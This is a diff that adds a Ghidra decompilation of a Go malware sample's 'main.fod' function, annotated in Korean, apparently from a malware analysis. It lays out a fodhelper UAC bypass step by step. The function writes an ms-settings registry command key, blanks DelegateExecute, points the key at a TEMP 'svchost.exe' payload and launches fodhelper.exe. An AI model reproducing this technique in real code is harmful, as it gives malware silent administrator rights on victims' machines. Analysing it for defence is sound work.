@@ -1,0 +1,83 @@
+// SystemFailureReporter.exe - main.fod 함수
+// Ghidra 디컴파일 분석
+  uStack0000000000000008 = param_1;               // 인자는 TEMP_DIR + "/" + "svchost.exe" 경로 포인터
+  uStack0000000000000010 = param_2;               // 인자는 경로 길이
+                    /* rs/stg/stg.go:39 */
+  while (&stack0x00000000 <= *(undefined1 **)(unaff_R14 + 0x10)) {
+                    /* rs/stg/stg.go:39 */
+    runtime.morestack_noctxt();
+  }
+  local_10 = in_XMM15_Qa;                         // defer 함수 포인터 초기화
+                    /* rs/stg/stg.go:47 */
+                    /* rs/stg/stg.go:39 */
+                    /* rs/stg/stg.go:42 */
+  golang.org/x/sys/windows/registry.CreateKey
+
+// CreateKey의 함수의 인자 [ func CreateKey(k Key, path string, access uint32) (newk Key, existed bool, err error) ]
+
+            (0x80000001,"Software\Classes\ms-settings\Shell\Open\Command",0x2f,0xf003f);
+                    /* rs/stg/stg.go:47 */
+
+  iVar1 = extraout_RCX;      // Key의 존재 여부 Boolean 반환 (0=새로생성, 1=기존존재)
+  uVar2 = extraout_RDI;      // 에러
+  if (extraout_RCX == 0) {                // Key 가 존재하지 않아서 새로 생성된 경우 IF 분기 시작
+
+                    /* rs/stg/stg.go:42 */
+                    /* rs/stg/stg.go:50 */
+
+    local_40[0] = main.fod.deferwrap1;    // defer 메커니즘 - CreateKey에 대한 CloseKey 함수 등록
+    local_10 = local_40;                  
+
+                    /* rs/stg/stg.go:52 */  
+                    /* golang.org/x/sys@v0.35.0/windows/registry/value.go:308 */
+
+    golang.org/x/sys/windows/registry.Key.setStringValue(extraout_RAX,"DelegateExecute",0xf,1,0,0); // 생성된 레지스트리 키에 DelegateExecute 값 설정
+                    /* rs/stg/stg.go:53 */                                                          // DelegateExecute를 공백으로 설정 (UAC 우회 필수 조건)
+
+    iVar1 = extraout_RAX_00;              // DelegateExecute 설정 결과
+    uVar2 = extraout_RBX;                 // 에러
+    if (extraout_RAX_00 == 0) {           // DelegateExecute 설정 성공 시
+                    /* golang.org/x/sys@v0.35.0/windows/registry/value.go:308 */
+
+      golang.org/x/sys/windows/registry.Key.setStringValue
+                (extraout_RAX,0,0,1,uStack0000000000000008,uStack0000000000000010);                // 레지스트리 기본값에 악성 파일 경로 설정
+                    /* rs/stg/stg.go:58 */                                                         // 기본값 = TEMP_DIR/svchost.exe (fodhelper 실행 시 이 파일이 관리자 권한으로 실행됨)
+      iVar1 = extraout_RAX_01;            // 기본값 설정 결과
+      uVar2 = extraout_RBX_00;            // 에러 객체
+      if (extraout_RAX_01 == 0) {                                                                  // 기본값 설정이 정상으로 됐다면 IF 분기 시작
+                    /* rs/stg/stg.go:62 */
+        uStack_28 = 2;                                                                             // cmd 인자 몇개인지
+        local_30 = "/c";                                                                           // cmd /c 명령어 옵션
+        uStack_18 = 0x21;                                                                          // fodhelper.exe 경로 문자열 길이
+        local_20 = "C:\Windows\System32\fodhelper.exe";                                            // UAC 악용을 위한 fodhelper.exe 경로설정
+
+        os/exec.Command("cmd",3,&local_30,2,2);                                                    // cmd /c "C:\Windows\System32\fodhelper.exe" 명령 지정
+        // os/exec.Command 함수의 인자 ( func Command(name string, arg ...string) *Cmd )
+                    /* rs/stg/stg.go:63 */                                                        
+        os/exec.(*Cmd).Start(this);       // fodhelper.exe 실행 (레지스트리를 읽어 악성 파일을 관리자 권한으로 실행)
+                    /* rs/stg/stg.go:64 */
+        if (extraout_RAX_02 == 0) {       // fodhelper.exe 실행 성공
+                    /* rs/stg/stg.go:67 */
+          (**local_10)();                 // defer 함수 실행 ( 레지스트리 키 Close )
+          return;                         // UAC 우회 성공으로 함수 종료
+        }
+                    /* rs/stg/stg.go:65 */
+        runtime.gopanic(*(undefined8 *)(extraout_RAX_02 + 8),extraout_RBX_01); // fodhelper 실행 실패 시
+        iVar1 = extraout_RAX_03;
+        uVar2 = extraout_RBX_02;
+      }
+                    /* rs/stg/stg.go:59 */
+      runtime.gopanic(*(undefined8 *)(iVar1 + 8),uVar2);
+      iVar1 = extraout_RAX_04;
+      uVar2 = extraout_RBX_03;
+    }
+                    /* rs/stg/stg.go:54 */
+    runtime.gopanic(*(undefined8 *)(iVar1 + 8),uVar2);
+    iVar1 = extraout_RCX_00;
+    uVar2 = extraout_RDI_00;
+  }
+                    /* rs/stg/stg.go:48 */
+  runtime.gopanic(*(undefined8 *)(iVar1 + 8),uVar2);
+  runtime.deferreturn();
+  return;
+}
